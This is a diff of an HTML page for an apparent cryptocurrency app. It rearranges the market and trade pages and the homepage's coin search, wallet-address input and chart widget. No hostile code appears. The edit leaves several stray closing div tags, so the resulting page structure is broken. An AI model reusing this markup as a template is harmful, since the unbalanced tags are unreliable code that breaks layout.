@@ -43,12 +43,15 @@
 <!-- Pages -->
 <div id="home-page" class="page active">
   <h2>Homepage</h2>
-  <input type="text" id="coin-search" class="search-input" placeholder="Search coin..."/>
-  <div id="coin-list"></div>
-  <div id="tradingview-widget-container"></div>
   <input type="text" id="wallet-address" class="search-input" placeholder="Enter wallet address"/>
   <button class="button" id="run-btn">Run</button>
-</div>
+ </div>
+ </div>
+  <div id="tradingview-widget-container"></div>
+  </div>
+  <input type="text" id="coin-search" class="search-input" placeholder="Search coin..."/>
+  <div id="coin-list"></div>
+  
 
 <div id="verification-page" class="page">
   <h2>Verification</h2>
@@ -111,8 +114,28 @@
   <h2>Withdrawal Successful</h2>
   <p>Your funds are now available.</p>
 </div>
+  
+<div id="market-page" class="page">
+  <h2>Market</h2>
+  <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
+  <div id="market-coin-list"></div>
+  <div id="market-tradingview-widget"></div>
+</div>
 
-  <!-- Settings Page -->
+<div id="trade-page" class="page">
+  <div class="card">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
+      <h2>Trade</h2>
+      <select id="trade-coin-select" style="background:#1a1f2b;color:white;padding:6px 12px;border-radius:6px;border:none;"></select>
+    </div>
+    <div id="trade-tradingview-widget" style="height:400px; margin-top:12px;"></div>
+    <div style="display:flex; gap:8px; margin-top:8px;">
+      <button id="buy-btn" style="flex:1;background:#00b300;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Buy</button>
+      <button id="sell-btn" style="flex:1;background:#ff3b30;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Sell</button>
+    </div>
+  </div>
+</div>
+    <!-- Settings Page -->
 <div id="settings-page" class="page">
   <div class="card">
     <h2>Settings</h2>
@@ -152,26 +175,7 @@
   <input type="text" id="support-input" class="search-input" placeholder="Type a message"/>
   <button class="button" id="support-send-btn">Send</button>
 </div>
-  
-<div id="market-page" class="page">
-  <h2>Market</h2>
-  <input type="text" id="market-search" class="search-input" placeholder="Search coin..."/>
-  <div id="market-coin-list"></div>
-  <div id="market-tradingview-widget"></div>
 </div>
-
-<div id="trade-page" class="page">
-  <div class="card">
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-      <h2>Trade</h2>
-      <select id="trade-coin-select" style="background:#1a1f2b;color:white;padding:6px 12px;border-radius:6px;border:none;"></select>
-    </div>
-    <div id="trade-tradingview-widget" style="height:400px; margin-top:12px;"></div>
-    <div style="display:flex; gap:8px; margin-top:8px;">
-      <button id="buy-btn" style="flex:1;background:#00b300;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Buy</button>
-      <button id="sell-btn" style="flex:1;background:#ff3b30;color:white;padding:8px 0;border-radius:6px;font-weight:bold;">Sell</button>
-    </div>
-  </div>
 </div>
 
 <!-- Footer -->
